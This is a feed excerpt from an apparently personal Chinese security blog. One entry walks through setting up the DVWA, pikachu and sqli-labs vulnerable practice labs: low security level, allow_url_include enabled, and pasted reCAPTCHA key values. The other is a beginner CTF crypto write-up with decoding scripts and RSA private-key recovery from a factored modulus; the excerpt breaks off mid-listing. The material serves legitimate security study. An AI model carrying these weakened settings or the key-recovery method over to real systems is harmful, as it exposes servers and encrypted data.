    <id>https://mercer5.github.io/2020/04/08/%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2020-04-08T05:33:44.000Z</published>
    <updated>2020-08-24T15:30:09.837Z</updated>
    
    <content type="html"><![CDATA[<h1 id="学习搭建环境"><a href="#学习搭建环境" class="headerlink" title="学习搭建环境"></a>学习搭建环境</h1><hr><p>最近想学一下安全的一些基本操作,所以搭了几个环境</p><p>在这里记录一下搭建的过程</p><p>尽量详细&gt;&lt;</p><hr><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><ol><li><p>下载phpstudy</p></li><li><p>下载dvwa源码: <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></p></li><li><p>下载pikachu源码: <a href="https://github.com/zhuifengshaonianhanlu/pikachu" target="_blank" rel="noopener">https://github.com/zhuifengshaonianhanlu/pikachu</a></p></li><li><p>下载sqli-labs源码: <a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p></li><li><p>安装好phpstudy后,开启服务</p><p><img src="Snipaste_2020-04-07_18-39-55.png" alt="Snipaste_2020-04-07_18-39-55"></p><p>变成这样</p><p><img src="Snipaste_2020-04-07_18-40-23.png" alt="Snipaste_2020-04-07_18-40-23"></p></li><li><p>把下载好的源码解压并拖到拖到phpstudy安装目录下的www中</p></li></ol><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><h3 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h3><ol><li>修改<code>DVWA-master/config/config.inc.php.dist</code>的文件名为<code>config.inc.php</code>,并用记事本打开,修改数据库密码为<code>root</code></li></ol><p><img src="Snipaste_2020-04-07_18-46-00.png" alt="Snipaste_2020-04-07_18-46-00"></p><ol start="2"><li><p><code>$_DVWA[ &#39;default_security_level&#39; ] = &#39;low&#39;;</code>同一个文件,修改以下默认开启的难度</p></li><li><p>在浏览器输入<code>http://127.0.0.1/DVWA-master/setup.php</code>,单机创建或重置数据库</p><p><img src="Snipaste_2020-04-07_18-48-40.png" alt="Snipaste_2020-04-07_18-48-40"></p><p>​  <img src="Snipaste_2020-04-07_18-48-55.png" alt="Snipaste_2020-04-07_18-48-55"></p></li><li><p>进入登陆界面,输入默认用户名:admin,密码:password,ojbk</p></li><li><p>但是在第三步,一片红红火火恍恍惚惚的,让人有些害怕,所以搞一下</p></li></ol><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ol><li><p>reCAPTCHA key：<strong>Missing</strong></p><p><code>DVWA-master/config/config.inc.php</code>文件夹中</p><p>找到下述文段,复制粘贴</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ <span class="string">'recaptcha_public_key'</span> ]  = <span class="string">'6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg'</span><span class="comment">;</span></span><br><span class="line">$_DVWA[ <span class="string">'recaptcha_private_key'</span> ] = <span class="string">'6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ'</span><span class="comment">;</span></span><br></pre></td></tr></table></figure></li><li><p>PHP function allow_url_include: <strong>Disabled</strong></p><p>网上找到的方法是</p><p><code>DVWA-master/php.ini</code>中,把<code>allow_url_include</code> 设置成<code>on</code></p><p>然后我发现这个已经是on了,那么是哪里错了呢?</p><p>然后就发现了这么一个好东西</p><p><img src="Snipaste_2020-04-08_14-40-35.png" alt="Snipaste_2020-04-08_14-40-35"></p><p>这个可以直接修改<code>phpstudy_pro\Extensions\php</code>里面的配置</p><p>所以这个也改一下,重启phpstudy,ojbk</p><p><strong>注意!!! 修改的是你这个网站所用的配置文件,由于下一个环境的搭建,我把切换成了5.2.17</strong></p></li><li><p>进入SQL Injection页面,报错……</p><p><strong>Parse error</strong>: syntax error, unexpected ‘[‘ in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\sqli_blind\index.php</strong> on line <strong>65</strong></p><p>找到该文件,修改</p><p><code>$num  = mysqli_fetch_row( $result )[0];</code>–&gt;<code>$num  = mysqli_fetch_row( $result );</code></p></li><li><p>PHP function magic_quotes_gpc: <strong>Enabled</strong></p><p>找不到解决办法&gt;&lt;</p><p>网上找到都没用跪了: (</p></li></ol><p>做个小小的补充</p><ul><li><p>难度默认是impossible,记得去<code>DVWA security</code>改<strong>(经过修改后默认是low了)</strong></p><p><img src="Snipaste_2020-04-08_13-15-56.png" alt="Snipaste_2020-04-08_13-15-56"></p></li></ul><h2 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h2><ol><li><p>用笔记本打开<code>pikachu-master\inc\config.inc.php</code>,修改数据库密码为本机的数据库密码</p><p>如果是<code>root</code>就不用改了</p><p><img src="Snipaste_2020-04-07_19-09-19.png" alt="Snipaste_2020-04-07_19-09-19"></p><p>同理修改一下<code>pikachu-master\pkxss\inc\config.inc.php</code></p></li><li><p>访问<code>http://localhost/pikachu-master/</code></p><p><img src="Snipaste_2020-04-07_19-15-33.png" alt="Snipaste_2020-04-07_19-15-33"></p></li><li><p>ojbk</p></li></ol><h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><ol><li><p>打开<code>sqli-labs-master\sql-connections\db-creds.inc</code>文件，将$dbpass参数值修改为root</p><p><img src="Snipaste_2020-04-07_20-19-37.png" alt="Snipaste_2020-04-07_20-19-37"></p></li><li><p>进入<code>http://127.0.0.1/sqli-labs-master/</code>,点击Setup/reset Database for labs</p></li><li><p>但是报错了</p><p><img src="Snipaste_2020-04-07_20-50-54.png" alt="Snipaste_2020-04-07_20-50-54"></p><p>出现这个问题是因为从PHP5.0开始mysql_connect()就不推荐使用了，到PHP7.0就直接被废弃了，如果PHP为7.0及以上版本的话用mysqli_connect()代替</p></li><li><p>所以到phpstudy改一下</p><p><img src="Snipaste_2020-04-07_20-40-37.png" alt="Snipaste_2020-04-07_20-40-37"></p><p><img src="Snipaste_2020-04-07_20-40-00.png" alt="Snipaste_2020-04-07_20-40-00"></p></li><li><p>重新Setup/reset Database for labs一下,出现以下界面</p><p><img src="Snipaste_2020-04-07_20-41-10.png" alt="Snipaste_2020-04-07_20-41-10"></p></li></ol><h2 id="站点目录"><a href="#站点目录" class="headerlink" title="站点目录"></a>站点目录</h2><p>虽然这样之后就可以用了</p><p><code>http://localhost/DVWA-master</code>进入DVWA</p><p><code>http://localhost/pikachu-master/</code>进入pikachu</p><p><code>http://localhost/sqli-labs-master/</code>进入sqli-labs</p><p>但是,每次输入那么多字,烦都烦死了,所以有没有什么方便的方法,搞个站点目录,直接点击进入呢?</p><p>从图中我们发现</p><p><img src="Snipaste_2020-04-07_19-26-46.png" alt="Snipaste_2020-04-07_19-26-46"></p><p>网站的首页是index.php或者index.html</p><p>点开www目录,确实有index.html文件</p><p>所以我们把该文件编辑一下</p><p><del>自己改写的辣鸡代码,就动了以下body和排版,大家可以自己修改一下(跪)</del></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>站点创建成功-phpstudy for windows<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"keywords"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"renderer"</span> <span class="attr">content</span>=<span class="string">"webkit"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge,chrome=1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, maximum-scale=1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"apple-mobile-web-app-status-bar-style"</span> <span class="attr">content</span>=<span class="string">"black"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"apple-mobile-web-app-capable"</span> <span class="attr">content</span>=<span class="string">"yes"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"format-detection"</span> <span class="attr">content</span>=<span class="string">"telephone=no"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"pragma"</span> <span class="attr">CONTENT</span>=<span class="string">"no-cache"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"Cache-Control"</span> <span class="attr">CONTENT</span>=<span class="string">"no-store, must-revalidate"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"expires"</span> <span class="attr">CONTENT</span>=<span class="string">"Wed, 26 Feb 1997 08:21:57 GMT"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"expires"</span> <span class="attr">CONTENT</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    body &#123;</span><br><span class="line">      font: 16px arial, 'Microsoft Yahei', 'Hiragino Sans GB', sans-serif;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h1 &#123;</span><br><span class="line">      margin: 0;</span><br><span class="line"><span class="css">      <span class="selector-tag">color</span>: <span class="selector-id">#3a87ad</span>;</span></span><br><span class="line">      font-size: 26px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.content</span> &#123;</span></span><br><span class="line">      width: 45%;</span><br><span class="line">      margin: 0 auto;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.content</span>&gt;<span class="selector-tag">div</span> &#123;</span></span><br><span class="line">      margin-top: 200px;</span><br><span class="line">      padding: 20px;</span><br><span class="line"><span class="css">      <span class="selector-tag">background</span>: <span class="selector-id">#d9edf7</span>;</span></span><br><span class="line">      border-radius: 12px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.content</span> <span class="selector-tag">dl</span> &#123;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">color</span>: <span class="selector-id">#2d6a88</span>;</span></span><br><span class="line">      line-height: 40px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.content</span> <span class="selector-tag">div</span> <span class="selector-tag">div</span> &#123;</span></span><br><span class="line">      padding-bottom: 20px;</span><br><span class="line">      text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>站点创建成功<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dt</span>&gt;</span>目录说明:<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./DVWA-master/"</span>&gt;</span>DVWA<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./pikachu-master/"</span>&gt;</span>pikachu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./sqli-labs-master/"</span>&gt;</span>sqli-labs<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结果图片</p><p>(test是我个人的网站,不用管)</p><p>(sqli-labs是后加的,所以图上没有)</p><p>(虽然不一样,但是上面的代码是可以直接用的,我已经修改过了)</p><p><img src="Snipaste_2020-04-07_19-33-16.png" alt="Snipaste_2020-04-07_19-33-16"></p><p>那么之后就可以直接点击进入了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;学习搭建环境&quot;&gt;&lt;a href=&quot;#学习搭建环境&quot; class=&quot;headerlink&quot; title=&quot;学习搭建环境&quot;&gt;&lt;/a&gt;学习搭建环境&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;最近想学一下安全的一些基本操作,所以搭了几个环境&lt;/p&gt;
&lt;p&gt;在这里记录一下搭建的过程&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="安全" scheme="https://mercer5.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全" scheme="https://mercer5.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-crypto-新手练习区</title>
    <link href="https://mercer5.github.io/2020/04/04/%C2%96%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crypto-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <id>https://mercer5.github.io/2020/04/04/%C2%96%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crypto-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</id>
    <published>2020-04-04T15:08:21.000Z</published>
    <updated>2020-08-24T15:30:09.809Z</updated>
    
    <content type="html"><![CDATA[<h1 id="攻防世界-crypto-新手练习区"><a href="#攻防世界-crypto-新手练习区" class="headerlink" title="攻防世界-crypto-新手练习区"></a>攻防世界-crypto-新手练习区</h1><h2 id="1-base64"><a href="#1-base64" class="headerlink" title="1. base64"></a>1. base64</h2><p>在线解密,或是自己写脚本都行</p><h2 id="2-Caesar"><a href="#2-Caesar" class="headerlink" title="2. Caesar"></a>2. Caesar</h2><p>同上</p><h2 id="3-Morse"><a href="#3-Morse" class="headerlink" title="3. Morse"></a>3. Morse</h2><p>同上</p><h2 id="4-混合编码"><a href="#4-混合编码" class="headerlink" title="4. 混合编码"></a>4. 混合编码</h2><ol><li>base64</li><li>html实体编码</li><li>base64</li><li>ascii</li></ol><h2 id="5-不仅仅是Morse"><a href="#5-不仅仅是Morse" class="headerlink" title="5. 不仅仅是Morse"></a>5. 不仅仅是Morse</h2><ol><li><p>morese解密</p><p>得到一串奇奇怪怪的东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAY_BE_HAVE_ANOTHER_DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA</span><br></pre></td></tr></table></figure></li><li><p>后面的AB的长度为170</p><ul><li>5的倍数</li><li>只有两个字母</li><li>2^5^为32,可以很方便的表示26个字母</li><li>所以假设0-25,分别对应a-z</li></ul></li><li><p>尝试解密看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#分割替换</span></span><br><span class="line">s=<span class="string">"AAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA"</span></span><br><span class="line">s=s.replace(<span class="string">"A"</span>,<span class="string">"0"</span>)</span><br><span class="line">s=s.replace(<span class="string">"B"</span>,<span class="string">"1"</span>)</span><br><span class="line">lst=[]</span><br><span class="line"><span class="keyword">while</span>(s):</span><br><span class="line">    lst.append(s[:<span class="number">5</span>])</span><br><span class="line">    s=s[<span class="number">5</span>:]</span><br><span class="line">print(lst)</span><br><span class="line"><span class="comment">#生成字典</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">b=string.ascii_lowercase</span><br><span class="line">l1=[]</span><br><span class="line">l2=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    l1.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    l2.append(i)</span><br><span class="line">dic=dict(zip(l2,l1))</span><br><span class="line">print(dic)</span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    num=int(i,<span class="number">2</span>)</span><br><span class="line">    print(dic.get(num),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="6-幂数加密"><a href="#6-幂数加密" class="headerlink" title="6. 幂数加密"></a>6. 幂数加密</h2>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#字母数字对应表生成</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">l1=[]</span><br><span class="line">l2=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">    l1.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_uppercase:</span><br><span class="line">    l2.append(i)</span><br><span class="line">dic=dict(zip(l1,l2))</span><br><span class="line">print(dic)</span><br><span class="line"><span class="comment">#字符串处理</span></span><br><span class="line">a=<span class="string">"8842101220480224404014224202480122"</span></span><br><span class="line">lst=a.split(<span class="string">"0"</span>)</span><br><span class="line">lst=[eval(x) <span class="keyword">for</span> x <span class="keyword">in</span> lst]</span><br><span class="line">lst1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    sum=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(i):</span><br><span class="line">        sum+=i%<span class="number">10</span></span><br><span class="line">        i=i//<span class="number">10</span></span><br><span class="line">    lst1.append(sum)</span><br><span class="line">print(lst1)</span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst1:</span><br><span class="line">    flag+=dic[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="6-easychallenge"><a href="#6-easychallenge" class="headerlink" title="6. easychallenge"></a>6. easychallenge</h2><p>给的是一个pyc文件,我就在在线python反编译网站上反编译了一下</p><p>得到python原码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode1</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) ^ <span class="number">36</span></span><br><span class="line">        x = x + <span class="number">25</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode2</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) + <span class="number">36</span></span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode3</span><span class="params">(ans)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32encode(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">' '</span></span><br><span class="line">print(<span class="string">'Please Input your flag:'</span>)</span><br><span class="line">flag = input()</span><br><span class="line">final = <span class="string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span></span><br><span class="line"><span class="keyword">if</span> encode3(encode2(encode1(flag))) == final:</span><br><span class="line">    print(<span class="string">'correct'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'wrong'</span>)</span><br></pre></td></tr></table></figure><p>emmm,然后就好办了,加密方法都在上面了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=<span class="string">"UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==="</span></span><br><span class="line">s1=base64.b32decode(s)</span><br><span class="line">print(s1)</span><br><span class="line"></span><br><span class="line">s2=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s1:</span><br><span class="line">    x=i^<span class="number">36</span></span><br><span class="line">    x-=<span class="number">36</span></span><br><span class="line">    s2+=chr(x)</span><br><span class="line">print(s2)</span><br><span class="line"></span><br><span class="line">s3=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s2:</span><br><span class="line">    x=ord(i)<span class="number">-25</span></span><br><span class="line">    x=x^<span class="number">36</span></span><br><span class="line">    s3+=chr(x)</span><br><span class="line">print(s3)</span><br></pre></td></tr></table></figure><h2 id="7-Normal-RSA"><a href="#7-Normal-RSA" class="headerlink" title="7. Normal_RSA"></a>7. Normal_RSA</h2><p>打开附件,里面是<code>pubkey.pem</code>和<code>flag.enc</code></p><p>我们可以利用kali里的openssl来搞</p><ol><li><p>把文件拖虚拟机里</p></li><li><p>终端输入openssl</p></li><li><p><code>openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem</code></p><ul><li>exponent:E</li><li>modulus:N</li></ul><p>以上两个要用,复制好</p></li><li><p>上网找在线分解质因数的搞出P,Q</p></li><li><p>然后在kali中使用(代码如下,pqe自填),会生成一个private.pem</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">arsa=RSA.generate(<span class="number">1024</span>)</span><br><span class="line">arsa.p=</span><br><span class="line">arsa.q=</span><br><span class="line">arsa.e=</span><br><span class="line">arsa.n=arsa.p*arsa.q</span><br><span class="line">Fn=long((arsa.p<span class="number">-1</span>)*(arsa.q<span class="number">-1</span>))</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    x=(Fn*i)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(x%arsa.e==<span class="number">0</span>):</span><br><span class="line">           arsa.d=x/arsa.e</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">private=open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(arsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure></li><li><p>在终端中打开openssl,输入<code>rsautl -decrypt -in flag.enc -inkey private.pem</code></p></li><li><p>ojbk</p></li></ol><h2 id="8-转轮机加密"><a href="#8-转轮机加密" class="headerlink" title="8. 转轮机加密"></a>8. 转轮机加密</h2><p>题目:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 